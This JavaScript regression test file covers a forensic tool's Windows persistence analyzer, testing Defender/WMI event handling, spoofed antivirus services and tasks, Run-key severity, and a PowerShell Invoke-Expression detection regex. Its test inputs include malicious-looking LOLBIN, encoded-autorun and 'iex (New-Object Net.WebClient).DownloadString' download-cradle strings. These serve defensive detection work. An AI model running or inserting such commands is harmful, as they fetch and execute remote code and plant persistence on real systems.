"use strict";

// FP-batch-1 regression tests for the persistence analyzer (2026-05-31 review).
// Covers: #A severity-reconcile-to-score, #G AV masquerade guard, #H task-LOLBIN drop guard,
// #I Defender/WMI channel fallback, #J PS-4104 bare-.Invoke( removal.

const test = require("node:test");
const assert = require("node:assert/strict");

const { getPersistenceAnalysis } = require("../electron/analyzers/persistence");
const { _resolveEventChannel, _evtxChannelMatches } = require("../electron/analyzers/evtx-utils");

// ---------- harness (mirrors persistence.test.js) ----------
const EVTXECMD_HEADERS = [
  "EventID", "Channel", "TimeCreated", "Computer", "UserName",
  "PayloadData1", "PayloadData2", "PayloadData3", "PayloadData4",
  "PayloadData5", "PayloadData6", "MapDescription", "ExecutableInfo",
];
const REGISTRY_HEADERS = ["KeyPath", "ValueName", "ValueData", "HivePath", "LastWriteTimestamp"];

function makeStub(headers, rows) {
  const colMap = {};
  headers.forEach((h, i) => { colMap[h] = `c${i}`; });
  const rowsByCN = rows.map((r, i) => {
    const out = { _rowid: i + 1 };
    headers.forEach((h) => { out[colMap[h]] = r[h] != null ? String(r[h]) : null; });
    return out;
  });
  function aliasRows(sql) {
    const aliasMatches = [...sql.matchAll(/c(\d+)\s+as\s+\[([a-zA-Z0-9_]+)\]/g)];
    return rowsByCN.map((r) => {
      const out = { _rowid: r._rowid };
      for (const [, idx, alias] of aliasMatches) out[alias] = r[`c${idx}`];
      return out;
    });
  }
  const db = {
    prepare(sql) {
      return {
        get() { return /COUNT\(\*\)/i.test(sql) ? { cnt: rowsByCN.length || 1 } : null; },
        all() {
          if (/^SELECT\s/i.test(sql) && /FROM\s+data/i.test(sql) && /\bas\s+\[/.test(sql)) return aliasRows(sql);
          return [];
        },
      };
    },
  };
  return { meta: { db, headers, colMap, tabId: "pf-test" }, ctx: { applyStandardFilters() {}, ensureIndex() {} } };
}
function evtxRow(eid, opts = {}) {
  return {
    EventID: String(eid), Channel: opts.channel || "", TimeCreated: opts.ts || "2026-03-15T10:00:00Z",
    Computer: opts.computer || "HOST-A", UserName: opts.user || "CORP\\analyst",
    PayloadData1: opts.pd1 || "", PayloadData2: opts.pd2 || "", PayloadData3: opts.pd3 || "",
    PayloadData4: opts.pd4 || "", PayloadData5: opts.pd5 || "", PayloadData6: opts.pd6 || "",
    MapDescription: opts.mapDesc || "", ExecutableInfo: opts.execInfo || "",
  };
}
function analyzeEvtx(rows, options = {}) {
  const { meta, ctx } = makeStub(EVTXECMD_HEADERS, rows);
  return getPersistenceAnalysis(meta, { mode: "evtx", ...options }, ctx);
}
function analyzeReg(rows, options = {}) {
  const { meta, ctx } = makeStub(REGISTRY_HEADERS, rows);
  return getPersistenceAnalysis(meta, { mode: "registry", ...options }, ctx);
}

// ============================================================
// #I — Defender / WMI channel fallback (silent-drop fix)
// ============================================================
test("#I channel fallback: blank-channel Defender/WMI EIDs resolve by event id", () => {
  for (const eid of ["5001", "5007", "5010", "5012", "5101"]) {
    assert.equal(_resolveEventChannel({ eventId: eid }), "defender", `${eid} → defender`);
  }
  assert.equal(_resolveEventChannel({ eventId: "5861" }), "wmi-activity", "5861 → wmi-activity");
  // With an explicit channel present, the resolver returns the channel-derived value (the raw
  // string), which still matches the ["defender"] rule via evtxChannelMatches' substring logic —
  // so the EID fallback doesn't regress the channel-present path.
  assert.ok(_evtxChannelMatches(_resolveEventChannel({ eventId: "5001", channel: "Microsoft-Windows-Windows Defender/Operational" }), ["defender"]),
    "explicit Defender channel must still match the defender rule");
});

test("#I channel fallback: Defender 5001 with BLANK channel is no longer dropped", () => {
  const rows = [evtxRow("5001", { channel: "", pd1: "Feature Name: Real-Time Protection", pd2: "New Value: Disabled", pd3: "Old Value: Enabled" })];
  const result = analyzeEvtx(rows);
  const item = result.items.find((i) => i.category === "Defender Tampering");
  assert.ok(item, "Defender 5001 must be detected even without a Channel value");
});

test("#I channel fallback: WMI 5861 with BLANK channel is no longer dropped", () => {
  const rows = [evtxRow("5861", { channel: "", pd1: "Operation: ESS started", pd2: "Consumer: CommandLineEventConsumer", pd3: "Query: SELECT * FROM __InstanceModificationEvent" })];
  const result = analyzeEvtx(rows);
  const item = result.items.find((i) => i.category === "WMI Persistence");
  assert.ok(item, "WMI 5861 must be detected even without a Channel value");
});

// ============================================================
// #G — AV/EDR masquerade guard
// ============================================================
test("#G AV masquerade: vendor-named service from a user-writable path is NOT whitelisted", () => {
  const rows = [evtxRow("7045", { channel: "System", pd2: "Name: csagent", execInfo: "C:\\Users\\Public\\CrowdStrike\\evil.exe" })];
  const result = analyzeEvtx(rows);
  const item = result.items.find((i) => i.category === "Services" && (i.artifact === "csagent" || i.details?.serviceName === "csagent"));
  assert.ok(item, "spoofed AV service must remain visible (not dropped)");
  assert.notEqual(item.severity, "low", "spoofed AV service must not be dampened to low");
  assert.ok(!item.whitelisted, "spoofed AV service must not be whitelisted");
});

test("#G AV masquerade: a real AV service from its install path is still whitelisted/dropped", () => {
  const rows = [evtxRow("7045", { channel: "System", pd2: "Name: csagent", execInfo: "C:\\Program Files\\CrowdStrike\\CSFalconService.exe" })];
  const result = analyzeEvtx(rows);
  const item = result.items.find((i) => i.category === "Services" && (i.artifact === "csagent" || i.details?.serviceName === "csagent"));
  // Legit AV service installs are hard-dropped by the whitelist filter (no regression).
  assert.ok(!item || item.severity === "low", "legitimate AV service must still be suppressed");
});

// ============================================================
// #H — vendor task hard-drop must carry suspicious-context guard
// ============================================================
test("#H task drop: spoofed vendor task with a LOLBIN action is NOT dropped", () => {
  const rows = [evtxRow("4698", {
    channel: "Security", pd2: "Task: \\Citrix Backdoor",
    execInfo: "C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\evil.dll,Run",
  })];
  const result = analyzeEvtx(rows);
  const item = result.items.find((i) => i.details?.taskName === "\\Citrix Backdoor" || (i.artifact || "").includes("Citrix Backdoor"));
  assert.ok(item, "a vendor-named task running a LOLBIN must survive the hard-drop filter");
});

test("#H task drop: a genuine clean vendor task is still dropped (no regression)", () => {
  const rows = [evtxRow("4698", {
    channel: "Security", pd2: "Task: \\Adobe Acrobat Update",
    execInfo: "C:\\Program Files (x86)\\Adobe\\Acrobat\\acrotray.exe",
  })];
  const result = analyzeEvtx(rows);
  const item = result.items.find((i) => (i.details?.taskName || "").includes("Adobe") || (i.artifact || "").includes("Adobe"));
  assert.ok(!item, "a clean vendor updater task must still be suppressed");
});

// ============================================================
// #A — severity badge reconciled to the dampened score
// ============================================================
test("#A severity-reconcile: a benign protected-path autorun is downgraded from high", () => {
  const rows = [{
    KeyPath: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    ValueName: "VendorAgent",
    ValueData: "C:\\Program Files\\Contoso\\agent.exe",
    HivePath: "C:\\Windows\\System32\\config\\SOFTWARE",
    LastWriteTimestamp: "2026-03-15T10:00:00Z",
  }];
  const result = analyzeReg(rows);
  const item = result.items.find((i) => i.category === "Run Keys");
  assert.ok(item, "Run key must be detected");
  // The protected-program-path dampener fired (benign reason present) ...
  assert.ok((item.suspiciousReasons || []).some((r) => /protected program path|enterprise autorun/i.test(r)),
    "benign protected-path dampener must fire");
  assert.equal(item.isSuspicious, false, "benign-dampened item must not be suspicious");
  // ... and the VISIBLE badge must follow the dampened score (was 'high' before the fix).
  assert.notEqual(item.severity, "high", "benign-dampened autorun must be downgraded from high");
  assert.notEqual(item.severity, "critical");
});

test("#A severity-reconcile: a genuinely malicious autorun keeps its high/critical badge", () => {
  const rows = [{
    KeyPath: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    ValueName: "Backdoor",
    ValueData: "C:\\Users\\Public\\evil.exe -enc aGVsbG8=",
    HivePath: "C:\\Users\\victim\\NTUSER.DAT",
    LastWriteTimestamp: "2026-03-15T10:00:00Z",
  }];
  const result = analyzeReg(rows);
  const item = result.items.find((i) => i.category === "Run Keys");
  assert.ok(item, "Run key must be detected");
  assert.equal(item.isSuspicious, true, "user-writable + encoded autorun must stay suspicious");
  assert.ok(["high", "critical"].includes(item.severity), "malicious autorun must keep a high/critical badge");
});

// ============================================================
// #J — PS-4104 bare `.Invoke(` no longer counts as Invoke-Expression
// ============================================================
test("#J PS indicator: bare .Invoke( is not treated as IEX; real iex/Invoke-Expression still are", () => {
  // Mirrors the (non-exported) PS_4104_SUSPICIOUS_INDICATORS Invoke-Expression entry after the fix.
  const IEX = /Invoke-Expression|\biex\s/i;
  assert.equal(IEX.test("$runspace.Invoke()"), false, "benign .Invoke() must NOT match");
  assert.equal(IEX.test("$sb.Invoke($args)"), false, "benign scriptblock .Invoke() must NOT match");
  assert.equal(IEX.test("iex $payload"), true, "real `iex ` must still match");
  assert.equal(IEX.test("Invoke-Expression $code"), true, "Invoke-Expression must still match");
  assert.equal(IEX.test("powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://x')\""), true);
});
